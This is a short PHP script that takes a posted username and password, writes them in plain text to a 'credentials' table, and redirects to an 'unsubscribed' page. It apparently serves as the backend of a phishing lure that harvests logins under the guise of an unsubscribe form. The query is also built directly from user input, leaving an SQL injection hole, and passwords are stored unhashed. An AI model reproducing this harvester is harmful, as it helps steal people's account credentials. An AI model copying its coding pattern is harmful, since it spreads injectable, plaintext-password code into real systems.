<?php

    include("connection.php");

    $user=$_POST["user"];
    $pass=$_POST["pass"];

    $sql="insert into credentials (username,password) values('$user','$pass')";
    mysqli_query($conn,$sql);
    header("Location:unsubscribed.php");

?>